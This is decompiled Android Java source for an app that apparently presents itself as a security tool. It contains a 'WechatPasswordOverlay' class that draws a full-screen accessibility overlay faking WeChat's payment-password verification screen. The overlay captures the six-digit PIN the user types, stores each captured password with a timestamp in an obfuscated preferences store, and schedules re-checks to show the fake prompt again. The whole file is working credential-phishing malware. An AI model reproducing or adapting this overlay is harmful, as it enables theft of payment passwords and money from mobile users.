package com.storm.safe.rock.service.modules.overlay;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import kotlin.AbstractC0767a0;
import okhttp3.HttpUrl;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0716jf;
import p000.ViewOnClickListenerC1203s1;
import p000.ViewOnClickListenerC1204s2;
import p000.m21;
import p000.oe1;
import p000.pe1;
import p000.t60;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.overlay.a1 */
/* loaded from: classes2.dex */
public final class C0354a1 {

    /* renamed from: b0 */
    public static final pe1 f53621b0 = new pe1(null);

    /* renamed from: b1 */
    public static volatile C0354a1 f53622b1;

    /* renamed from: a0 */
    public final Context f53623a0;

    /* renamed from: a1 */
    public final WindowManager f53624a1;

    /* renamed from: a2 */
    public LinearLayout f53625a2;

    /* renamed from: a3 */
    public boolean f53626a3;

    /* renamed from: a6 */
    public TextView f53629a6;

    /* renamed from: a9 */
    public final Handler f53632a9;

    /* renamed from: a4 */
    public String f53627a4 = "";

    /* renamed from: a5 */
    public final ArrayList f53628a5 = new ArrayList();

    /* renamed from: a7 */
    public final Handler f53630a7 = new Handler(Looper.getMainLooper());

    /* renamed from: a8 */
    public final y90 f53631a8 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.overlay.WechatPasswordOverlay$density$2
        {
            super(0);
        }

        @Override // p000.w00
        public final Object invoke() {
            return Float.valueOf(this.f53608a0.f53623a0.getResources().getDisplayMetrics().density);
        }
    });

    public C0354a1(Context context) {
        this.f53623a0 = context;
        Object systemService = context.getSystemService("window");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
        this.f53624a1 = (WindowManager) systemService;
        this.f53632a9 = new Handler(Looper.getMainLooper());
    }

    /* renamed from: a0 */
    public final void m211900a0() {
        int i;
        String[] strArr;
        String str;
        int i2;
        Context context;
        View view;
        Context context2 = this.f53623a0;
        LinearLayout linearLayout = new LinearLayout(context2);
        linearLayout.setOrientation(1);
        linearLayout.setBackgroundColor(-1);
        LinearLayout linearLayout2 = new LinearLayout(context2);
        linearLayout2.setOrientation(1);
        linearLayout2.setGravity(1);
        linearLayout2.setPadding(m211901a1(24), m211901a1(60), m211901a1(24), m211901a1(32));
        linearLayout2.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        TextView textView = new TextView(context2);
        textView.setText("身份验证");
        textView.setTextSize(22.0f);
        String str2 = "#111111";
        textView.setTextColor(Color.parseColor("#111111"));
        textView.setGravity(17);
        textView.setTypeface(textView.getTypeface(), 1);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
        layoutParams.bottomMargin = m211901a1(10);
        textView.setLayoutParams(layoutParams);
        TextView textView2 = new TextView(context2);
        textView2.setText("请验证支付密码确认本人操作");
        textView2.setTextSize(14.0f);
        textView2.setTextColor(Color.parseColor("#888888"));
        textView2.setGravity(17);
        textView2.setLayoutParams(new LinearLayout.LayoutParams(-2, -2));
        linearLayout2.addView(textView);
        linearLayout2.addView(textView2);
        int iM211901a1 = ((context2.getResources().getDisplayMetrics().widthPixels - (m211901a1(24) * 2)) - (m211901a1(8) * 5)) / 6;
        LinearLayout linearLayout3 = new LinearLayout(context2);
        linearLayout3.setOrientation(0);
        linearLayout3.setGravity(16);
        linearLayout3.setPadding(m211901a1(24), m211901a1(24), m211901a1(24), m211901a1(16));
        linearLayout3.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        int i3 = 0;
        for (int i4 = 6; i3 < i4; i4 = 6) {
            TextView textView3 = new TextView(context2);
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(iM211901a1, iM211901a1);
            if (i3 > 0) {
                layoutParams2.setMarginStart(m211901a1(8));
            }
            textView3.setLayoutParams(layoutParams2);
            textView3.setGravity(17);
            textView3.setTextSize(20.0f);
            textView3.setTextColor(-16777216);
            textView3.setText("");
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setColor(Color.parseColor("#EBEBEB"));
            gradientDrawable.setCornerRadius(m211901a1(8));
            textView3.setBackground(gradientDrawable);
            this.f53628a5.add(textView3);
            linearLayout3.addView(textView3);
            i3++;
        }
        TextView textView4 = new TextView(context2);
        textView4.setText("");
        textView4.setTextSize(13.0f);
        textView4.setTextColor(Color.parseColor("#FF4444"));
        textView4.setGravity(17);
        textView4.setVisibility(8);
        textView4.setPadding(m211901a1(24), m211901a1(4), m211901a1(24), m211901a1(4));
        textView4.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        this.f53629a6 = textView4;
        View view2 = new View(context2);
        view2.setLayoutParams(new LinearLayout.LayoutParams(-1, 0, 1.0f));
        LinearLayout linearLayout4 = new LinearLayout(context2);
        linearLayout4.setOrientation(1);
        linearLayout4.setBackgroundColor(Color.parseColor("#E5E7EB"));
        linearLayout4.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        String[][] strArr2 = {new String[]{"1", "2", "3"}, new String[]{"4", "5", "6"}, new String[]{"7", "8", "9"}, new String[]{"", "0", "DEL"}};
        int i5 = 0;
        int i6 = 0;
        for (int i7 = 4; i6 < i7; i7 = 4) {
            String[] strArr3 = strArr2[i6];
            int i8 = i5 + 1;
            LinearLayout linearLayout5 = new LinearLayout(context2);
            linearLayout5.setOrientation(0);
            String[][] strArr4 = strArr2;
            int i9 = i5;
            LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-1, m211901a1(56));
            if (i9 > 0) {
                layoutParams3.topMargin = m211901a1(1);
            }
            linearLayout5.setLayoutParams(layoutParams3);
            int length = strArr3.length;
            int i10 = 0;
            int i11 = 0;
            while (i10 < length) {
                int i12 = length;
                String str3 = strArr3[i10];
                int i13 = i11 + 1;
                int iM211901a12 = i11 > 0 ? m211901a1(1) : 0;
                if (str3.length() == 0) {
                    View view3 = new View(context2);
                    i = i10;
                    strArr = strArr3;
                    str = str2;
                    i2 = i6;
                    LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                    layoutParams4.setMarginStart(iM211901a12);
                    view3.setLayoutParams(layoutParams4);
                    view3.setBackgroundColor(Color.parseColor("#F3F4F6"));
                    view = view3;
                } else {
                    i = i10;
                    strArr = strArr3;
                    str = str2;
                    i2 = i6;
                    if (str3.equals("DEL")) {
                        TextView textView5 = new TextView(context2);
                        textView5.setText("×");
                        textView5.setTextSize(24.0f);
                        textView5.setTextColor(Color.parseColor("#333333"));
                        textView5.setGravity(17);
                        LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                        layoutParams5.setMarginStart(iM211901a12);
                        textView5.setLayoutParams(layoutParams5);
                        textView5.setBackgroundColor(Color.parseColor("#F3F4F6"));
                        textView5.setOnClickListener(new ViewOnClickListenerC1203s1(7, this));
                        view = textView5;
                    } else {
                        TextView textView6 = new TextView(context2);
                        textView6.setText(str3);
                        textView6.setTextSize(22.0f);
                        textView6.setTextColor(Color.parseColor(str));
                        textView6.setGravity(17);
                        context = context2;
                        LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                        layoutParams6.setMarginStart(iM211901a12);
                        textView6.setLayoutParams(layoutParams6);
                        textView6.setBackgroundColor(-1);
                        textView6.setOnClickListener(new ViewOnClickListenerC1204s2(this, str3, 1));
                        view = textView6;
                        linearLayout5.addView(view);
                        i10 = i + 1;
                        context2 = context;
                        length = i12;
                        i11 = i13;
                        strArr3 = strArr;
                        str2 = str;
                        i6 = i2;
                    }
                }
                context = context2;
                linearLayout5.addView(view);
                i10 = i + 1;
                context2 = context;
                length = i12;
                i11 = i13;
                strArr3 = strArr;
                str2 = str;
                i6 = i2;
            }
            linearLayout4.addView(linearLayout5);
            i6++;
            i5 = i8;
            context2 = context2;
            strArr2 = strArr4;
        }
        linearLayout.addView(linearLayout2);
        linearLayout.addView(linearLayout3);
        linearLayout.addView(this.f53629a6);
        linearLayout.addView(view2);
        linearLayout.addView(linearLayout4);
        this.f53625a2 = linearLayout;
        WindowManager.LayoutParams layoutParams7 = new WindowManager.LayoutParams();
        layoutParams7.width = -1;
        layoutParams7.height = -1;
        layoutParams7.type = 2032;
        layoutParams7.format = -3;
        layoutParams7.gravity = 8388659;
        layoutParams7.flags = 262912;
        WindowManager windowManager = this.f53624a1;
        if (windowManager != null) {
            windowManager.addView(this.f53625a2, layoutParams7);
        }
    }

    /* renamed from: a1 */
    public final int m211901a1(int i) {
        return (int) (((Number) this.f53631a8.getValue()).floatValue() * i);
    }

    /* renamed from: a2 */
    public final void m211902a2(String str) {
        if (this.f53626a3) {
            if (t60.m214686a2(str, "DEL")) {
                if (this.f53627a4.length() > 0) {
                    this.f53627a4 = m21.m213934e2(this.f53627a4);
                    m211905a5();
                    return;
                }
                return;
            }
            if (this.f53627a4.length() < 6) {
                this.f53627a4 = AbstractC0003a2.m32b3(this.f53627a4, str);
                m211905a5();
                if (this.f53627a4.length() == 6) {
                    this.f53630a7.postDelayed(new oe1(this, 3), 300L);
                }
            }
        }
    }

    /* renamed from: a3 */
    public final void m211903a3(boolean z) {
        if (this.f53626a3) {
            this.f53626a3 = false;
            t60.m214702c3("WechatPasswordOverlay", "🔒 隐藏密码框，passwordCaptured=" + z);
            if (!z) {
                t60.m214702c3("WechatPasswordOverlay", "📅 安排 2 秒后重新检查弹窗");
                this.f53632a9.postDelayed(new oe1(this, 0), 2000L);
            }
            this.f53630a7.post(new oe1(this, 1));
        }
    }

    /* renamed from: a4 */
    public final void m211904a4(String str, String str2, long j) {
        String str3 = HttpUrl.PATH_SEGMENT_ENCODE_SET_URI;
        try {
            SharedPreferences sharedPreferences = this.f53623a0.getSharedPreferences(StringUtil.m212470a0("J1YSMXIoDT1EJiRLFQVFMR86WCMy"), 0);
            String string = sharedPreferences.getString("history", HttpUrl.PATH_SEGMENT_ENCODE_SET_URI);
            if (string != null) {
                str3 = string;
            }
            JSONArray jSONArray = new JSONArray(str3);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("password", str);
            jSONObject.put("type", str2);
            jSONObject.put("timestamp", j);
            jSONObject.put("source", "wechat");
            jSONArray.put(jSONObject);
            SharedPreferences.Editor editorEdit = sharedPreferences.edit();
            editorEdit.putString("history", jSONArray.toString());
            editorEdit.putInt("count", jSONArray.length());
            editorEdit.apply();
        } catch (Exception e) {
            t60.m214705c6("WechatPasswordOverlay", "❌ 保存密码历史记录失败", e);
        }
    }

    /* renamed from: a5 */
    public final void m211905a5() {
        int i = 0;
        while (i < 6) {
            ArrayList arrayList = this.f53628a5;
            t60.m214695b6(arrayList, "<this>");
            TextView textView = (TextView) ((i < 0 || i > AbstractC0716jf.m213305g4(arrayList)) ? null : arrayList.get(i));
            if (textView != null) {
                textView.setText(i < this.f53627a4.length() ? "●" : "");
                GradientDrawable gradientDrawable = new GradientDrawable();
                gradientDrawable.setColor(Color.parseColor("#EBEBEB"));
                gradientDrawable.setCornerRadius(m211901a1(8));
                textView.setBackground(gradientDrawable);
            }
            i++;
        }
    }
}
